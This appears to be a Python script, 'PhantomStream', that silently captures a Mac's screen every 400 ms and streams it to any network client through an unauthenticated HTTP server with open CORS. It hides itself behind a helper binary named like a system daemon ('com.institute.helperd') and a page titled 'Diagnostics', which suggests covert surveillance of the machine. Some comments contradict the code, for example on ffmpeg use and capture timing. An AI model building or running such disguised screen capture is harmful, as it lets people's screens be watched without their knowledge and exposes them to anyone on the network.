#!/usr/bin/env python3
"""
PhantomStream v1.0 — File-based Frame Server (Grok-validated architecture)

Architecture (eliminates pipe starvation at nice -n 19):
  ffmpeg -update 1 → /tmp/ps_frame.jpg   (overwrites file each frame)
  Python reads file per /frame request    (no pipe, no thread, no deadlock)
  JS setTimeout recursion updates tablet  (no setInterval skip problem)

Endpoints:
  GET /        → HTML viewer with JS polling
  GET /frame   → latest JPEG from file (served fresh per request)
  GET /health  → JSON status for monitoring
"""

import os
import sys
import signal
import socket
import subprocess
import threading
import time
import json

INSTALL_DIR  = os.path.dirname(os.path.abspath(__file__))
FFMPEG       = os.path.join(INSTALL_DIR, "com.institute.helperd")
LOG_FILE     = os.path.join(INSTALL_DIR, "stream.log")
PID_FILE     = os.path.join(INSTALL_DIR, "stream.pid")
FPID_FILE    = os.path.join(INSTALL_DIR, "ffmpeg.pid")
FRAME_FILE   = "/tmp/ps_frame.jpg"   # ffmpeg writes here; Python reads here
PORT         = 49213

# ── HTML: setTimeout recursion — fires next fetch only AFTER previous completes
# This prevents the setInterval skip-frame problem when fetch takes >interval ms
HTML = """<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Diagnostics</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box }
    body { background:#000; width:100vw; height:100vh;
           display:flex; align-items:center; justify-content:center }
    img  { max-width:100%; max-height:100vh; object-fit:contain }
  </style>
</head>
<body>
  <img id="f" src="/frame">
  <script>
    var el = document.getElementById('f');
    var INTERVAL = 200;   /* ms between frame fetches — lower = smoother */
    var RETRY    = 500;   /* ms to wait after an error */

    function fetchNext() {
      var img = new Image();
      img.onload = function() {
        el.src = img.src;              /* swap only on successful load */
        setTimeout(fetchNext, INTERVAL);
      };
      img.onerror = function() {
        setTimeout(fetchNext, RETRY);  /* back off on error */
      };
      img.src = '/frame?' + Date.now();  /* cache-bust each request */
    }

    /* Start after first image renders so tablet shows something immediately */
    el.onload  = function() { fetchNext(); };
    el.onerror = function() { setTimeout(fetchNext, RETRY); };
  </script>
</body>
</html>"""
HTML = HTML.encode()


def _serve_frame(conn: socket.socket) -> None:
    """Read latest JPEG from file and serve it. No pipe, no lock, no thread."""
    try:
        with open(FRAME_FILE, "rb") as fh:
            frame = fh.read()
    except (FileNotFoundError, OSError):
        conn.sendall(
            b"HTTP/1.1 503 Service Unavailable\r\n"
            b"Retry-After: 1\r\nConnection: close\r\n\r\n"
        )
        conn.close()
        return

    conn.sendall(
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: image/jpeg\r\n"
        b"Content-Length: " + str(len(frame)).encode() + b"\r\n"
        b"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        b"Pragma: no-cache\r\n"
        b"Access-Control-Allow-Origin: *\r\n"
        b"Connection: close\r\n\r\n"
        + frame
    )
    conn.close()


def _serve_health(conn: socket.socket) -> None:
    """JSON health — frame age is the only signal (screencapture, no ffmpeg PID)."""
    frame_age = -1
    try:
        frame_age = round(time.time() - os.path.getmtime(FRAME_FILE), 2)
    except OSError:
        pass

    payload = json.dumps({
        "status":      "ok" if 0 <= frame_age < 2.0 else "degraded",
        "frame_age_s": frame_age,
    }).encode()

    conn.sendall(
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
        + payload
    )
    conn.close()


def _handle_client(conn: socket.socket) -> None:
    try:
        raw = b""
        conn.settimeout(5.0)
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(1024)
            if not chunk:
                return
            raw += chunk

        first_line = raw.split(b"\r\n")[0].decode(errors="replace")
        path = first_line.split(" ")[1].split("?")[0] if " " in first_line else "/"

        if path == "/frame":
            _serve_frame(conn)
        elif path == "/health":
            _serve_health(conn)
        else:
            conn.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                b"Content-Length: " + str(len(HTML)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + HTML
            )
            conn.close()
    except Exception:
        try: conn.close()
        except: pass


def _capture_loop(log_fh) -> None:
    """Capture screen every 400ms (2.5fps) using screencapture + sips resize.
    No persistent avfoundation session = no TCC stale-frame bug.
    sips resizes 1440x900 → 800x500 + JPEG q60 → ~40-80KB per frame.
    """
    raw = FRAME_FILE + ".raw"
    tmp = FRAME_FILE + ".tmp"
    while True:
        try:
            r = subprocess.run(
                ["screencapture", "-x", "-t", "jpg", raw],
                capture_output=True, timeout=4
            )
            if r.returncode == 0 and os.path.getsize(raw) > 0:
                subprocess.run(
                    ["sips", "-z", "500", "800",
                     "-s", "format", "jpeg",
                     "-s", "formatOptions", "60",
                     raw, "--out", tmp],
                    capture_output=True, timeout=4
                )
                if os.path.getsize(tmp) > 0:
                    os.replace(tmp, FRAME_FILE)
            else:
                log_fh.write(f"[capture] screencapture failed rc={r.returncode}\n")
                log_fh.flush()
        except Exception as e:
            log_fh.write(f"[capture] error: {e}\n")
            log_fh.flush()
        time.sleep(0.4)  # 2.5fps — easier on i5-5350U


def main() -> None:
    with open(PID_FILE, "w") as fh:
        fh.write(str(os.getpid()))

    try: os.remove(FRAME_FILE)
    except FileNotFoundError: pass

    log_fh = open(LOG_FILE, "a")

    def _cleanup(signum=None, frame=None) -> None:
        try: log_fh.close()
        except: pass
        try: os.remove(FRAME_FILE)
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, _cleanup)
    signal.signal(signal.SIGINT,  _cleanup)

    # screencapture loop — fresh grab every 333ms, no avfoundation session
    threading.Thread(target=_capture_loop, args=(log_fh,), daemon=True).start()

    # ── Wait for first frame before accepting connections ─────────────────────
    deadline = time.time() + 10
    while not os.path.exists(FRAME_FILE):
        if time.time() > deadline:
            print("[server] ffmpeg did not produce first frame in 10s — check log",
                  flush=True)
            break
        time.sleep(0.2)

    # ── HTTP server ───────────────────────────────────────────────────────────
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(32)

    while True:
        try:
            conn, _ = srv.accept()
            threading.Thread(
                target=_handle_client,
                args=(conn,),
                daemon=True
            ).start()
        except OSError:
            break


if __name__ == "__main__":
    main()
